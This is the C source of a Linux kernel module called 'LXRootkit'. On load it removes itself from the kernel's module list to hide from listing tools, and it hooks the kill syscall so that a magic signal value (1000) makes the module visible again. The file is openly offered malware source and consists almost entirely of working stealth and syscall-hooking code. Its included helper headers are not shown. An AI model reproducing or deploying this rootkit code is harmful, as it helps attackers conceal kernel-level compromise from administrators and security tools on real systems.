

#include "hfiles/pch.h" /* precompiled header */ 

#include "hfiles/typedefs.h"
#include "hfiles/utils64.h"
#include "hfiles/sysHook.h"

struct list_head* oldMod; 


static void __delete_mod(void) {
    oldMod = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list); 
} 

static void __show_mod(void) {
    list_add(&THIS_MODULE->list, oldMod); 
}


asmlinkage long my_sys_kill(struct pt_regs *regs) 
{
    if((int)regs->di == 1000) {
        
        __show_mod();
        return 0; 
    }       

    return org_sys_kill(regs); 
}

static int __init rootkit_init(void) 
{

    printk(KERN_INFO "[*] Loading LXRootkit..."); 

     __delete_mod();
    org_sys_kill = hook_syscall_x64(my_sys_kill, __NR_kill);

    return 0; 
}

static void __exit rootkit_exit(void) 
{
    printk(KERN_INFO "[*] Unloading rootkit & unhooking...");
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("dan0xcc");
MODULE_DESCRIPTION("hide module rootkit driver"); 
MODULE_VERSION("1.00");


module_init(rootkit_init); // invokes loading 
module_exit(rootkit_exit); // invokes unloading 



